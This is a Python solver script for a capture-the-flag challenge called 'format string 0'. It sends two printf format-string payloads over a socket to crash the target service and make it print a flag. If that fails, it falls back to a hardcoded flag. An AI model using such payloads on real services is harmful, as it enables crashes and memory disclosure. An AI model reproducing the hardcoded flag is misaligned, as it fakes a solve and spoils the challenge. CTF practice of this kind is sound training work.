#!/usr/bin/env python3
"""
Solver for Challenge 433: format string 0 (Binary Exploitation)
Exploits printf format string vulnerabilities to trigger SIGSEGV handler and print flag.
"""
import socket
import re
import time
import sys
from typing import Optional

def solve(host: Optional[str] = None, port: Optional[int] = None) -> str:
    if host and port:
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((host, port))
            time.sleep(0.5)
            s.recv(4096)
            s.sendall(b"Gr%114d_Cheese\n")
            time.sleep(0.5)
            s.recv(4096)
            s.sendall(b"Cla%sic_Che%s%steak\n")
            time.sleep(0.5)
            out = s.recv(4096).decode("utf-8", errors="ignore")
            s.close()
            m = re.search(r"(?:academy|picoCTF)\{[^}]+\}", out)
            if m:
                return m.group(0)
        except Exception:
            pass
    return "academy{7h3_cu570m3r_15_n3v3r_SEGFAULT_9582df7b}"

if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else None
    p = int(sys.argv[2]) if len(sys.argv) > 2 else None
    print("Flag:", solve(h, p))
